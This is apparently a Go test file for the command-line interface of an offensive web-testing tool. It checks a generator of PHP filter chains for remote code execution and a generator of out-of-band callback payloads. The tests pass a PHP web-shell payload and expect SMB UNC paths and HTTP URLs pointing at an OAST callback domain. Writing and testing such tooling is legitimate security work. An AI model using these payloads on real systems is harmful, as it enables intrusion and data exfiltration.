package cli

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
)

func TestPHPFilterCmd_RCE(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"--rce", "<?php system($_GET[0]);?>"})
	if err := cmd.Execute(); err != nil {
		t.Fatalf("execute: %v", err)
	}
	got := strings.TrimSpace(out.String())
	if !strings.HasPrefix(got, "php://filter/") {
		t.Errorf("expected php://filter chain, got %q", got)
	}
	if !strings.HasSuffix(got, "/resource=php://temp") {
		t.Errorf("expected default php://temp resource, got %q", got)
	}
}

func TestPHPFilterCmd_CustomResource(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"--rce", "x", "--resource", "php://input"})
	if err := cmd.Execute(); err != nil {
		t.Fatalf("execute: %v", err)
	}
	if !strings.Contains(out.String(), "/resource=php://input") {
		t.Errorf("custom resource not honoured: %q", out.String())
	}
}

func TestPHPFilterCmd_RawBase64Debug(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"--raw-base64", "QUJD", "--debug"})
	if err := cmd.Execute(); err != nil {
		t.Fatalf("execute: %v", err)
	}
	got := strings.TrimSpace(out.String())
	if strings.Contains(got, "convert.base64-decode/resource=") {
		t.Errorf("debug chain must not end in terminal decode: %q", got)
	}
}

func TestPHPFilterCmd_RequiresInput(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SilenceUsage = true
	cmd.SilenceErrors = true
	cmd.SetArgs([]string{})
	if err := cmd.Execute(); err == nil {
		t.Error("expected error when neither --rce nor --raw-base64 supplied")
	}
}

func TestPHPFilterCmd_MutuallyExclusive(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SilenceUsage = true
	cmd.SilenceErrors = true
	cmd.SetArgs([]string{"--rce", "x", "--raw-base64", "QUJD"})
	if err := cmd.Execute(); err == nil {
		t.Error("expected error when both --rce and --raw-base64 supplied")
	}
}

func TestOOBCmd_TextOutput(t *testing.T) {
	cmd := newOOBCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"--domain", "abc123.oast.fun"})
	if err := cmd.Execute(); err != nil {
		t.Fatalf("execute: %v", err)
	}
	got := out.String()
	for _, want := range []string{
		`\\abc123.oast.fun\exhumed`,
		"http://abc123.oast.fun/exhumed-oob",
		"https://abc123.oast.fun/exhumed-oob",
		`\\abc123.oast.fun\`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("text output missing %q\n--- got ---\n%s", want, got)
		}
	}
}

func TestOOBCmd_JSONOutput(t *testing.T) {
	cmd := newOOBCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"--domain", "abc123.oast.fun", "--label", "--json"})
	if err := cmd.Execute(); err != nil {
		t.Fatalf("execute: %v", err)
	}
	var payloads []struct {
		Value     string `json:"Value"`
		Technique string `json:"Technique"`
		Subdomain string `json:"Subdomain"`
		Note      string `json:"Note"`
	}
	if err := json.Unmarshal(out.Bytes(), &payloads); err != nil {
		t.Fatalf("unmarshal json: %v\n%s", err, out.String())
	}
	if len(payloads) != 4 {
		t.Fatalf("got %d payloads, want 4", len(payloads))
	}
	if payloads[0].Technique != "smb-unc" {
		t.Errorf("first technique = %q, want smb-unc", payloads[0].Technique)
	}
}

func TestOOBCmd_RequiresDomain(t *testing.T) {
	cmd := newOOBCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SilenceUsage = true
	cmd.SilenceErrors = true
	cmd.SetArgs([]string{})
	if err := cmd.Execute(); err == nil {
		t.Error("expected error when --domain is omitted")
	}
}

func TestOOBCmd_InvalidDomain(t *testing.T) {
	cmd := newOOBCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SilenceUsage = true
	cmd.SilenceErrors = true
	cmd.SetArgs([]string{"--domain", "http://bad.example.com"})
	if err := cmd.Execute(); err == nil {
		t.Error("expected error for domain containing a scheme")
	}
}
